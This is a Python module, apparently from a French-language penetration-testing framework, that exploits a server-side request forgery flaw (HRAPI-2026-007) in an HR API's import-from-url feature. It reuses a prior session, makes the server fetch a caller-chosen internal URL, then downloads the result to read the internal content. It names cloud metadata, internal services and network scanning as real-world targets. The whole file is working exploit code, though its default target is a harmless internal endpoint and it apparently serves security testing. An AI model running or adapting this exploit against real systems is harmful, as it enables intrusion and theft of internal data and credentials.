"""HRAPI-2026-007 — SSRF via import-from-url."""

from __future__ import annotations
from .base import Module, Option, Context


class Exploit(Module):
    id = "HRAPI-2026-007"
    name = "documents/ssrf_import_from_url"
    cwe = "CWE-918"
    cvss = "9.1 (Critique)"
    description = (
        "import-from-url recupere une URL cote serveur sans filtrer l'hote ni "
        "l'IP resolue. Preuve : le serveur va chercher une URL interne choisie "
        "par l'appelant et le contenu devient telechargeable (SSRF full-read). "
        "Par defaut, cible un endpoint interne inoffensif de l'API elle-meme."
    )
    options = {
        "url": Option(
            default="http://127.0.0.1:4000/api/v1/",
            help="URL interne a faire recuperer par le serveur",
        ),
    }

    def run(self, ctx: Context) -> bool:
        access = ctx.store.get("ACCESS")
        if not access:
            ctx.fail("Pas de session. Lance d'abord HRAPI-2026-001.")
            return False

        url = self.opt(ctx.store, "url")
        ctx.info(f"Demande au serveur de recuperer : {url}")
        res = ctx.client.import_from_url(access, {"url": url, "fileName": "ssrf-proof.txt"})
        doc = res.get("data", {})
        if res.get("status", 500) >= 400 or not doc.get("id"):
            ctx.fail(f"Import refuse (status={res.get('status')}). Detail: {res.get('error')}")
            return False

        ctx.ok(f"Le serveur a recupere l'URL interne. Document id={doc.get('id')}")
        ctx.info(f"Type recu : {doc.get('mimeType')} — {doc.get('sizeBytes')} octets")

        # Recuperation du contenu : c'est le volet 'full-read' de la SSRF.
        r = ctx.client.download_document(access, doc["id"])
        if r.status_code == 200:
            body = r.text[:200].replace("\n", " ")
            ctx.ok("Contenu de la ressource interne exfiltre (extrait) :")
            ctx.line(f"      {body}")
        ctx.info("En conditions reelles : metadonnees cloud, services internes, scan reseau.")
        return True
